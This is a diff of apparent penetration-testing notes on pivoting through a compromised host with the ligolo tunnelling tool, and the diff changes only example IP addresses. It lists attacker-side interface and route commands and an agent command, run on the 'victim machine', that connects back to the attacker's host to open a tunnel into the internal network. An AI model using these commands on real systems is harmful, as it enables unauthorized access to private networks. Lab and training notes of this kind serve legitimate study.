@@ -15,11 +15,11 @@ Lets define some variables for the example:
 - Setup in attack machine:
 	# sudo ip tuntap add user $USER mode tun ligolo
 	# sudo ip link set ligolo up
-	# sudo ip route add 172.16.96.0/24 dev ligolo (Here we specify that the network route should go through our ligolo device)
+	# sudo ip route add 172.16.136.0/24 dev ligolo (Here we specify that the network route should go through our ligolo device)
 	# ./proxy -selfcert (Note the port from the output: Listening on 0.0.0.0:11601)
 
 - Launch agent in victim machine:
-	# ./agent -connect 192.168.45.201:11601 -ignore-cert
+	# ./agent -connect 192.168.45.151:11601 -ignore-cert
 
 - In ligolo console:
 	# session
@@ -29,7 +29,7 @@ Lets define some variables for the example:
 		If error "bind: permission denied" appear we need to specify another unused port greather than 1000
 
 - To clear everything once we have finished
-	# sudo ip route del 10.4.216.0/24 dev ligolo
+	# sudo ip route del 172.16.136.0/24 dev ligolo
 	# sudo ip link del ligolo
 ```
 
